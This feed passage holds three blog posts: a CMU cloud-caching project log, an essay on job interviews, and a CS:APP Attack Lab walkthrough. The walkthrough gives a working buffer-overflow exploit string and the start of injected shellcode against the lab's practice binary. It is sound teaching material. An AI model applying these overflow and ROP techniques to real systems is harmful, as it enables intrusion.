<h2 id="u9879_u76EE_u65E5_u5FD7"><a href="#u9879_u76EE_u65E5_u5FD7" class="headerlink" title="项目日志"></a>项目日志</h2><p>首先可以直接利用上个项目的代码，用指定的镜像开好四个机器，检查一下是否开机成功，都没问题之后，就可以 ssh 到我们的 Front End 机器：<code>ssh ubuntu@yourdns.eastus.cloudapp.azure.com</code>，然后把所有文件都复制下来方便本地修改：<code>scp -r ubuntu@yourdns.eastus.cloudapp.azure.com:~/vertx/* ./</code>，里面还是有不少文件的，不过我们这次只需要修改一个 <code>MSB.java</code>。</p>
<p>先来看看具体我们要做什么，观察 <code>MSB.java</code>，会发现这次处理请求的实现方式和之前都不一样，留意以下这一段代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">vertx.createHttpServer().requestHandler(<span class="keyword">new</span> Handler&lt;HttpServerRequest&gt;() &#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handle</span><span class="params">(HttpServerRequest req)</span> </span>&#123;</span><br><span class="line">        String query_type = req.path();</span><br><span class="line">        req.response().headers().set(<span class="string">"Content-Type"</span>, <span class="string">"text/plain"</span>);</span><br><span class="line">        <span class="keyword">if</span>(query_type.equals(<span class="string">"/target"</span>)) &#123;</span><br><span class="line">            String key = req.params().get(<span class="string">"targetID"</span>);</span><br><span class="line">            processRequest(key,req);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (query_type.equals(<span class="string">"/range"</span>)) &#123;</span><br><span class="line">            String start = req.params().get(<span class="string">"start_range"</span>);</span><br><span class="line">            String end = req.params().get(<span class="string">"end_range"</span>);</span><br><span class="line">            processRequest(start, end, req);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;).listen(<span class="number">80</span>);</span><br></pre></td></tr></table></figure>
<p>可以看到这里在 80 端口打开了一个监听器，每次遇到请求，就会调用其中的 <code>handle(HttpServerRequest req)</code> 函数，那么这个函数里做了什么事情呢？</p>
<ol>
<li>根据不同的请求类型，执行不同的请求</li>
<li>具体的请求在 <code>retrieveDetail</code> 函数中完成</li>
</ol>
<p>所以具体来说，要做好的是以下四个事情：</p>
<ol>
<li>确定缓存所使用的数据结构</li>
<li>确定缓存替换记录的策略</li>
<li>确定需要缓存多少请求</li>
<li>确定两个 data center 的访问策略</li>
</ol>
<p>基本上做好这四个事情，就算是完成任务了。修改完成之后可以把文件传回服务器 <code>scp -r ./MSB.java ubuntu@yourdns.eastus.cloudapp.azure.com:~/vertx/</code></p>
<p>AWS 部分改动不多，改一下 data center 的地址就好，上传的代码为：<code>scp -i demo.pem ./MSB.java ubuntu@dns.compute-1.amazonaws.com:~/</code>，然后 ssh 过去运行 <code>ssh -i demo.pem ubuntu@dns.compute-1.amazonaws.com</code></p>
<p>这次的作业比较简单，希望以后也能这么开心。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>前面我们已经了解了如何进行 autoscaling 和自定义负载均衡器，这一课我们来接触另一个在 web 服务中非常重要的概念——缓存。</p>]]>
    
    </summary>
    
      <category term="AWS" scheme="http://wdxtub.com/tags/AWS/"/>
    
      <category term="Azure" scheme="http://wdxtub.com/tags/Azure/"/>
    
      <category term="CMU" scheme="http://wdxtub.com/tags/CMU/"/>
    
      <category term="云计算" scheme="http://wdxtub.com/tags/%E4%BA%91%E8%AE%A1%E7%AE%97/"/>
    
      <category term="缓存" scheme="http://wdxtub.com/tags/%E7%BC%93%E5%AD%98/"/>
    
      <category term="Technique" scheme="http://wdxtub.com/categories/Technique/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[编程起跑线 番外 技术面试感悟]]></title>
    <link href="http://wdxtub.com/2016/02/14/interview-guide/"/>
    <id>http://wdxtub.com/2016/02/14/interview-guide/</id>
    <published>2016-02-14T23:25:08.000Z</published>
    <updated>2016-02-15T03:24:45.000Z</updated>
    <content type="html"><![CDATA[<p>本文属于不务正业及歪门邪道，没有太多判断力的同学请不要点开或立即关闭本页面。</p>
<a id="more"></a>
<hr>
<h2 id="u7F18_u8D77"><a href="#u7F18_u8D77" class="headerlink" title="缘起"></a>缘起</h2><p>去年确定要回国之后，基本已经停止了投简历和刷题。这两天完成了（可能是）最后一次 onsite 面试，连续飞来飞去，身心俱疲，但是能免费出去玩，见见朋友聊聊天，还是值得去感受下的。</p>
<p>从去年九月开始，到现在也算是找了小半年工作了，除了一开始什么都不懂有些迷茫之外，整个过程基本处于可控的状态，从前期的找节奏热身，到后面针对性去考察不同公司，可以说还都是比较顺利的。因为我的动机和大部分人不一样，所以这里谈及的所有，很可能对另一个人没有任何可操作性，当然，如果你对一个『奇葩』的思路和做法感兴趣，请继续。</p>
<p>借用知乎体，问为什么之前先要问是什么，于是问题来了：什么是面试？什么是找工作？</p>
<p>狭义来说，找工作面试类似于从学生到社会人身份转换的认证考试，考试成绩可能和工资公司职位有关。但一切认证考试背后的目的是对应的能力，比方说考驾照，背后对应的是驾驶车辆，判断路况以及做出最佳选择的能力。那么在找工作面试这件事儿上，所需的能力是什么呢？</p>
<p>简单来说八个字：观察、思考、沟通、行动。</p>
<p>观察不只是看题，更是审时度势说什么不说什么；思考不只是算法，更是逻辑和知识框架的建立；沟通不只是套近乎，更是因势利导去了解对方的思维模式；行动不只是刷题，更是通过试错和改进让自己更快完成身份转换。</p>
<p>当然，刷题也没什么错，但是不要用战术上的勤奋掩饰战略上的懒惰，道理都懂，我不多说。不过如果连我前面在说什么都看不懂的话，还是老老实实刷题吧。</p>
<p>我还记得小时候刚开始学英语的时候，面对一个一个不知所云的单词时的无助（当然 GRE 考试我也有这个感觉）。但是这些跟找工作相比（其实具体指对应的能力），就太九牛一毛了。那些可以量化的指标往往都是清晰的，难易暂且不说，但是至少我们有终点，也有起点。</p>
<p>可是对于那些直觉类的能力，由于悟道时间的不确定，我们唯一能做的就是不断坚持修炼直到开化的那天。</p>
<p>从这个角度来说，面试就是一个学习的过程，一个公司专门找五六个人陪你聊天帮你成长，不但不收钱还报销一切费用，难道还有更好的事情嘛？就用这么好的机会来刷刷题，难道不觉得很浪费嘛？</p>
<p>对于半只脚踏入社会的毕业生来说，重要的是尽一切可能去汲取那些在学校里无法获取的知识和经验，当然，结果也重要，不过如果你能在这个过程中学到足够多的东西，结果反而是水到渠成的事情，不必过多担心。</p>
<h2 id="u6B66_u5668"><a href="#u6B66_u5668" class="headerlink" title="武器"></a>武器</h2><p>就我的感觉来看，简历在没被刷掉之后，作用就基本等于零了。除非参与过一些举世闻名的项目，或者刚好和面试官的领域吻合，不然说真的没人在意。假如硬要说面试官会在面试的时候看，这都面对面了，直接跟他介绍自己不就得了嘛。</p>
<p>当然这不是说简历不重要，简历重要性在于做简历。要知道每往上面加哪怕一条记录，都需要大量的努力，这些背后的一点一滴，才是简历的价值，然后价值决定价格，价格会浮动，不要因为一点浮动就恐慌性抛售，沉住气，闷声发大财。</p>
<p>整个找工作过程中，一定要慢慢形成适合自己的合理的思维模式。在学校里，只要足够努力，很多时候都能取得比较好的成绩，但是在步入社会的过程中，或多或少会有迷茫无助的时刻，感觉自己已经刷了很多题目，很认真准备了简历，为什么还是屡战屡败。</p>
<p>但反过来看，这其实是一个很好的强迫自己去审视自己的机会，看看自己那一步出了问题，然后对应去调整，再根据新的反馈来继续调整，这其实就是面对没有标准解答的问题的时候的最佳实践。就好像机器学习里，有正样本，也有负样本，只有综合考虑运用，才能得到最佳的学校效果。</p>
<p>一旦有了这种思维，那么飞花落叶皆可伤人，比方说刷题，其实意义很大吗？不大，但是如果接着找工作的压力，检查去做，并从中验证和改进自己的学习和理解能力，那意义就大了。所谓努力，不应该只是战术上的，更应该是战略上的，而时不时停下来，审视自己之前的工作和方向，并根据观察和反馈设定下一阶段的目标，则是很重要的战略努力。</p>
<p>就像大侠最重要的不是武器，而是『勇气、侠义、爱与宽容』一样（古龙先生语），学习最重要的不是知识点，而是『学会学习与学会解决问题』。仔细想想，如果感觉自己因为所谓的『目标』而跑偏的话，那么现在回头，还是来得及的。</p>
<h2 id="u62DB_u5F0F"><a href="#u62DB_u5F0F" class="headerlink" title="招式"></a>招式</h2><p>不同公司的文化不同，风格不同，技术倾向不同，人员组成不同，千奇百怪组合起来，就像武林中的各个门派一样。江湖中有通用的功夫吗？并没有！所以见招拆招就很重要了。当然，有些门派就是天生不适合，那也不必强求，要知道，那些想一统武林的人，通常都没有什么好下场。</p>
<p>不过门派虽多，还是有规律可寻。招式的变化终究是有穷尽的，兵器的变化其实也不多，本来想多实地考察几个公司学百晓生写个兵器谱，但是东岸西岸飞一次要老命，前两天的红眼航班让我彻底放弃了这个念头，于是这个部分就随心写一下。</p>
<p>总体来说，无论大公司小公司，算法题基本就是主要沟通方式了，毕竟其他也没有什么好说的，毕竟面得多，可能一开始比较有激情，后面对着面试者，面试官更多就是打个卡了。</p>
<p>大公司制度严明，一开始就会告诉你所有的安排，接下来就是按部就班完成；小公司比较随意，谁有空谁来面，每次面多久也基本没有稳定值，最近去湾区一家小公司一口气面了 7 轮，真是『想要逃』，想大喊一声『老子就这么屌我们不要废话了爱要要不要拉倒』，恩我也就是想想而已。</p>
<p>打戏，要拍得好看，一定要有来有往，面试也一样，不能因为是求职的一方，就先自降一等，不卑不亢，该说什么说什么，为了一份工作，真不值得放弃更重要的东西。</p>
<p>偷懒地说，面试官有两种，大部分都是第一种，只有很少是第二种。第一种就是心中有题目也有答案，你没说出他想要的答案，那就是不行。第二种是心中有题目，但没有答案，会和你一起『努力』去解决一个问题。</p>
<p>第一种算是比较没有诚意的（当然还可以更没有诚意，这里就不提了），在网上找个题目看看答案然后心里只有标准答案，这样真的有很大意义吗？我觉得稍微学过一点计算机的，都可以做到，当然，毕竟有一定的工作经验，但是就这样似乎『事不关己』等待面试者给出正确答案，可能给出的评价也没有多少参考价值吧。遇到第二种面试官，整个面试过程变成了一个完美的大型互动教学活动，只能说好好珍惜，能学到很多有用的东西。</p>
<p>什么才是好的面试题目呢？当然是根据自己平时工作的场景，抽象成比较简单的设计+编码题，不需要太难，但是可以综合考察到面试者思考问题的角度以及对计算机学科的理解，最后的编码可以了解算法能力。最好可以带一点新概念，这样还能考察面试者的快速学习和理解能力。当然还有很多值得考察的角度，不过都比较花心思，估计大部分打卡型面试官，是不会这样的，所以大家还是可以放心刷题。</p>
<h2 id="u79D8_u7B08"><a href="#u79D8_u7B08" class="headerlink" title="秘笈"></a>秘笈</h2><p>写到这我有点累了。但是还是要厕所里挂钟——有始有终。</p>
<p>如何看人还是要向老祖宗取经，这里推荐一本书《冰鉴》，不要看译注版本（里面举得例子很多比较牵强）。</p>
<p>试探的话有以下方法，这里就不展开了：</p>
<ul>
<li>故意写错比较关键但是不大容易发现的小失误，看面试官能否及时指出</li>
<li>故意写错比较关键的地方，但是精心设计几个看似合理但其实是『陷阱测试用例』，看看面试官能不能自己绕出逻辑陷阱（递归中这个方法很好用）</li>
<li>摸清楚面试官擅长的领域，然后开始扯他不熟悉的领域，看他的表现（比如说扯一点汇编，扯一点硬件）</li>
<li>写完一个解法之后问问面试官有没有什么优化的方法，如果他说有，问他怎么有，如果他说没有，你就给出一个优化的方法</li>
<li>其他很多…自行发挥创意</li>
</ul>
<p>当然这些慎用，装逼有风险，起手需谨慎。</p>
<h2 id="u91D1_u76C6"><a href="#u91D1_u76C6" class="headerlink" title="金盆"></a>金盆</h2><p>总结一下就是，还是要把时间用在更有意义的地方。</p>
<p>很多内容文章里只能点到为止，想要详细了解的同学可以趁我还在匹兹堡（目测五月中下旬走）的时候约饭聊。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>本文属于不务正业及歪门邪道，没有太多判断力的同学请不要点开或立即关闭本页面。</p>]]>
    
    </summary>
    
      <category term="交流" scheme="http://wdxtub.com/tags/%E4%BA%A4%E6%B5%81/"/>
    
      <category term="人生" scheme="http://wdxtub.com/tags/%E4%BA%BA%E7%94%9F/"/>
    
      <category term="算法" scheme="http://wdxtub.com/tags/%E7%AE%97%E6%B3%95/"/>
    
      <category term="面试" scheme="http://wdxtub.com/tags/%E9%9D%A2%E8%AF%95/"/>
    
      <category term="Technique" scheme="http://wdxtub.com/categories/Technique/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[深入理解计算机系统 习题课 3 Attacklab]]></title>
    <link href="http://wdxtub.com/2016/02/14/csapp-lab3/"/>
    <id>http://wdxtub.com/2016/02/14/csapp-lab3/</id>
    <published>2016-02-14T22:45:14.000Z</published>
    <updated>2016-02-14T23:03:25.000Z</updated>
    <content type="html"><![CDATA[<p>这次的作业中，我们将要亲自上手利用漏洞来进行代码注入的攻击，听起来很刺激不是吗？</p>
<a id="more"></a>
<hr>
<h2 id="u603B_u4F53_u4ECB_u7ECD"><a href="#u603B_u4F53_u4ECB_u7ECD" class="headerlink" title="总体介绍"></a>总体介绍</h2><p>这一次我们将实现两种不同类型的攻击：</p>
<ul>
<li>缓冲区溢出攻击</li>
<li>ROP 攻击</li>
</ul>
<p>x86-64 架构的寄存器有一些使用习惯，比如：</p>
<p><img src="/images/14553978485119.jpg" alt=""></p>
<p>函数调用前需要把某些以后仍旧需要用到的值保存起来。</p>
<p>而对于 x86-64 的栈来说，栈顶的地址最小，栈底的地址最大，寄存器 <code>%rsp</code> 保存着指向栈顶的指针。栈支持两个操作：</p>
<ul>
<li><code>push %reg</code>：<code>%rsp</code> 的值减去 8，把寄存器 <code>%reg</code> 中的值放到 <code>(%rsp)</code> 中</li>
<li><code>pop %reg</code>：把寄存器 <code>(%rsp)</code> 中的值放到 <code>%reg</code> 中，<code>%rsp</code> 的值加上 8</li>
</ul>
<p>接下来需要了解的事情是，每个函数都有自己的栈帧(stack frame)，可以把它理解为每个函数的工作空间，保存着：</p>
<ul>
<li>本地变量</li>
<li>调用者和被调用者保存的寄存器里的值</li>
<li>其他一些函数调用可选的值</li>
</ul>
<p>如下图所示</p>
<p><img src="/images/14553985892568.jpg" alt=""></p>
<p>x86-64 的函数调用过程，需要做的设置有：</p>
<ul>
<li>调用者：<ul>
<li>为要保存的寄存器值及可选参数分配足够大控件的栈帧</li>
<li>把所有调用者需要保存的寄存器存储在帧中</li>
<li>把所有需要保存的可选参数按照逆序存入帧中</li>
<li><code>call foo:</code> 会先把 <code>%rip</code> 保存到栈中，然后跳转到 label <code>foo</code> </li>
</ul>
</li>
<li>被调用者<ul>
<li>把任何被调用者需要保存的寄存器值压栈减少 <code>%rsp</code> 的值以便为新的帧腾出空间</li>
</ul>
</li>
</ul>
<p>x86-64 的函数返回过程：</p>
<ul>
<li>被调用者<ul>
<li>增加 <code>%rsp</code> 的计数，逆序弹出所有的被调用者保存的寄存器，执行 <code>ret: pop %rip</code></li>
</ul>
</li>
</ul>
<p>有了上面的基础知识，我们大概就能明白，利用缓冲区溢出，实际上是通过重写返回值地址，来执行另一个代码片段，就是所谓代码注入了。比较关键的点在于</p>
<ul>
<li>熟悉 x86-64 约定俗成的用法</li>
<li>使用 <code>objdump -d</code> 来了解相关的偏移量</li>
<li>使用 <code>gdb</code> 来确定栈地址</li>
</ul>
<p>这之后，我们需要把需要注入的代码转换位字节码，这样机器才能执行，这里可以使用 <code>gcc</code> 和 <code>objdump</code> 来完成这个工作</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 假设 foo.s 是我们想要注入的代码</span></span><br><span class="line">vim foo.s</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用 gcc 生成对应的字节码 foo.o</span></span><br><span class="line">gcc -c foo.s</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过 objdump 来查看其内容，可以看到对应的字节码</span></span><br><span class="line">objdump <span class="operator">-d</span> foo.o | less</span><br><span class="line"></span><br><span class="line"><span class="comment"># 然后需要把十六进制代码转换成字符串这样我们可以写在程序里</span></span><br><span class="line">./hex2raw -i inputfile -o outputfile</span><br></pre></td></tr></table></figure>
<p>另一种攻击是使用 return-oriented programming 来执任意代码，这种方法在 stack 不可以执行或者位置随机的时候很有用。</p>
<p>这种方法主要是利用 gadgets 和 string 来组成注入的代码。具体来说是使用 <code>pop</code> 和 <code>mov</code> 指令加上某些常数来执行特定的操作。也就是说，利用程序已有的代码，重新组合成我们需要的东西，这样就绕开了系统的防御机制。</p>
<p>举个例子，一个代码片段如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">(<span class="keyword">char</span> *input)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">32</span>];</span><br><span class="line">    ...</span><br><span class="line">    <span class="built_in">strcpy</span> (buf, inputt;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>假设我们这里想要把一个值 <code>0xBBBBBBBB</code> 弹出到 <code>%rbx</code> 中并且移动它到 <code>%rax</code> 中，我们找到下面两个 gadgets:</p>
<ul>
<li><code>address1: mov %rbx, %rax; ret</code></li>
<li><code>address2: pop %rbx; ret</code></li>
</ul>
<p><img src="/images/14554030733407.jpg" alt=""></p>
<p>所以在这里我们其实不需要关心如何在 buffer 中运行我们的代码，而只需要知道 buffer 的 size，从而改写返回地址，即可以利用程序中原有的代码进行我们的操作。</p>
<p>在这个例子中，因为 address2 中的代码是把栈顶的值弹出到 <code>%rbx</code> 中，所以执行的时候，就会把 <code>0xBBBBBBBB</code> 放到 <code>%rbx</code> 中，现在程序就指向 address1 了，然后就会继续执行 address1，也就达到我们的目的，把 <code>0xBBBBBBBB</code> 放到了 <code>%rax</code> 中。</p>
<p>那么问题来了，我们如何能找到想要的 gadget 呢？在这个试验中，提供了一个 <code>farm.c</code>，可以从这里找到我们需要的 gadgets。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c  farm.c</span><br><span class="line">objdump <span class="operator">-d</span> farm.o | less</span><br></pre></td></tr></table></figure>
<p>一些建议：</p>
<ul>
<li>注意寻找 <code>c3</code> 结尾的代码，因为这可以作为每个 gadget 的最后一句（也就是正常返回）</li>
<li>画出栈的图</li>
<li>注意字节的顺序 (little endian)</li>
</ul>
<h2 id="u51C6_u5907_u5DE5_u4F5C"><a href="#u51C6_u5907_u5DE5_u4F5C" class="headerlink" title="准备工作"></a>准备工作</h2><ul>
<li>先下载好试验的压缩包，然后上传到学校的主机上：<code>scp target334.tar dawang@shark.ics.cs.cmu.edu:~/513</code></li>
<li>接着 ssh 过去：<code>ssh -X dawang@shark.ics.cs.cmu.edu</code></li>
<li>然后解压：<code>tar -xvf target334.tar</code></li>
</ul>
<p>然后就可以看到这次试验的『战场』了：</p>
<p><img src="/images/14554099850201.jpg" alt=""></p>
<p>大概介绍下每个文件的作用：</p>
<ul>
<li><code>ctarget</code>: 用来做代码注入攻击的程序</li>
<li><code>rtarget</code>: 用来做 ROP 攻击的程序</li>
<li><code>cookie.txt</code>: 一个 8 位的 16 进制代码，用来作为攻击的标识符</li>
<li><code>farm.c</code>: 用来找寻 gadget 的源文件</li>
<li><code>hex2raw</code>: 用来生成攻击字符串的程序</li>
</ul>
<p><code>ctarget</code> 和 <code>rtarget</code> 都会从标准输入中读取字符串，然后保存在一个大小为 <code>BUFFER_SIZE</code> 的 char 数组中（具体的大小每个人的程序都不大一样）。我们可以通过两次输入测试来看看程序具体的行为，一次是正常输入，第二次会输入超出 <code>BUFFER_SIZE</code> 个数的字符串。</p>
<p><img src="/images/14554110293851.jpg" alt="第一次"></p>
<p><img src="/images/14554110781316.jpg" alt="第二次"></p>
<p>所以我们要做的就是输入合理的字符串，来触发对应的操作。用于攻击的程序还可以做到</p>
<p><img src="/images/14554114722403.jpg" alt="这次即使尝试错误也不会扣分"></p>
<p>比较有用的是可以把输入放在文件里，这样就不用每次打一长串了。</p>
<p>有几点需要注意：</p>
<ul>
<li>输入的字符串中不能有 <code>0x0a</code>，因为这是 <code>\n</code> 的意思，遇到这个的话会提前结束输入</li>
<li><code>hex2raw</code> 每次需要输入一个 2 位的 16 进制编码，如果想要输出 0，那么需要写 00。想要转换 <code>0xdeadbeef</code>，需要传入 <code>ef be ad de</code>，因为是 little-endian 规则</li>
</ul>
<p>具体有 5 个任务，如下：</p>
<p><img src="/images/14554126934270.jpg" alt=""></p>
<h2 id="u7B2C_u4E00_u9636_u6BB5"><a href="#u7B2C_u4E00_u9636_u6BB5" class="headerlink" title="第一阶段"></a>第一阶段</h2><p>这一关中我们暂时还不需要注入新的代码，只需要让程序重定向调用某个方法就好。<code>ctarget</code> 的正常流程是</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">    val = getbuf();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"NO explit. Getbuf returned 0x%x\n"</span>, val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们要做的是调用程序中的另一个函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    vlevel = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Touch!: You called touch1()\n"</span>);</span><br><span class="line">    validate(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>也就是在 <code>getbuf()</code> 函数返回的时候，执行 <code>touch1()</code> 而不是返回 <code>test()</code>。下面是一些建议：</p>
<ul>
<li>本关所需要的所有信息都可以在 <code>ctarget</code> 的汇编代码中找到</li>
<li>具体要做的是把 <code>touch1</code> 的开始地址放到 <code>ret</code> 指令的返回地址中</li>
<li>注意字节的顺序</li>
<li>可以用 gdb 在 <code>getbuf</code> 的最后几条指令设置断点，来看程序有没有完成所需的功能</li>
<li>具体 <code>buf</code> 在栈帧中的位置是由 <code>BUFFER_SIZE</code> 决定的，需要仔细察看来进行判断</li>
</ul>
<p>接下来我们就开始解题。</p>
<p>首先是反编译成汇编代码：<code>objdump -d ctarget &gt; ctarget.txt</code></p>
<p>然后把这个文件传到本地方便查看：<code>scp dawang@shark.ics.cs.cmu.edu:~/513/target334/ctarget.txt ./</code></p>
<p>接下来我们需要确定 <code>getbuf</code> 到底创建了多大的缓冲区，检索 <code>getbuf</code>，代码如下：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">000000000040181c &#60;getbuf&#62;:&#10;  40181c:&#9;48 83 ec 28          sub    $0x28,%rsp&#10;  401820:&#9;48 89 e7             mov    %rsp,%rdi&#10;  401823:&#9;e8 88 02 00 00       callq  401ab0 &#60;Gets&#62;&#10;  401828:&#9;b8 01 00 00 00       mov    $0x1,%eax&#10;  40182d:&#9;48 83 c4 28          add    $0x28,%rsp&#10;  401831:&#9;c3                   retq   &#10;  401832:&#9;90                   nop&#10;  401833:&#9;90                   nop</span><br></pre></td></tr></table></figure>
<p>可以看到这里把 <code>%rsp</code> 移动了 <code>0x28</code>(40) 位，也就是说，我们的缓冲区有 40 位，再上面的四位就是原来正常需要返回到 <code>test</code> 的返回地址（注意看之前的栈帧图），我们要做的就是利用缓冲区溢出把这个返回地址改掉。</p>
<p>于是我们继续搜素，来看看 <code>touch1</code> 在哪里：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0000000000401834 &#60;touch1&#62;:&#10;  401834:&#9;48 83 ec 08          sub    $0x8,%rsp&#10;  401838:&#9;c7 05 9a 3c 20 00 01 movl   $0x1,0x203c9a(%rip)        # 6054dc &#60;vlevel&#62;</span><br></pre></td></tr></table></figure>
<p>可以看到地址在 <code>0x401834</code> 这里，但是我们要凑够 8 位，就是 <code>0x00401834</code>，于是我们需要输入的字符串就可以是这样：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">34</span> <span class="number">18</span> <span class="number">40</span> <span class="number">00</span></span><br></pre></td></tr></table></figure>
<p>前四十位是啥都不重要，后面四位按照 little endian 的规则逆向填上地址就好（注意这里为了排版用了换行，实际上都应该在一行，用空格分开），这样就改写了属于原来的返回地址。</p>
<p>接着我们把这个字符文件转换成字节码 <code>./hex2raw &lt; p1.txt &gt; p1r.txt</code>，最后执行一下 <code>./ctarget -i p1r.txt</code>，就可以看到结果了：</p>
<p><img src="/images/14554180666014.jpg" alt="成功完成第一关"></p>
<p>从第一关我们就学到了如何利用缓冲区来调用另外的过程，接下来我们来看第二关。</p>
<h2 id="u7B2C_u4E8C_u9636_u6BB5"><a href="#u7B2C_u4E8C_u9636_u6BB5" class="headerlink" title="第二阶段"></a>第二阶段</h2><p>第二关中需要插入一小段代码，<code>ctarget</code> 中的 <code>touch2</code> 函数的 C 语言如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch2</span><span class="params">(<span class="keyword">unsigned</span> val)</span></span>&#123;</span><br><span class="line">    vlevel = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> (val == cookie)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Touch2!: You called touch2(0x%.8x)\n"</span>, val);</span><br><span class="line">        validate(<span class="number">2</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Misfire: You called touch2(0x%.8x)\n"</span>, val);</span><br><span class="line">        fail(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>根据代码就可以看出来，我们需要把自己的 cookie 作为参数传进去，这里需要把参数放到 <code>%rdi</code> 中，只使用 <code>ret</code> 来进行跳转。</p>
<p>所以第一步，我们先来写需要注入的代码(文件 p2.s)：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov $0x45374fee,%rdi # set my cookie as the first parameter&#10;pushq $0x401860&#10;ret</span><br></pre></td></tr></table></figure>
<p>这里首先把参数传入到 <code>%rdi</code> 寄存器中，然后把 <code>touch2</code> 函数的起始地址压入栈中，最后返回，这样就可以跳转到 <code>touch2</code>。然后转换成对应的机器码 </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c p2.s</span><br><span class="line">objdump <span class="operator">-d</span> p2.o &gt; p2.byte</span><br></pre></td></tr></table></figure>
<p>得到 p2.byte 文件的内容是</p>
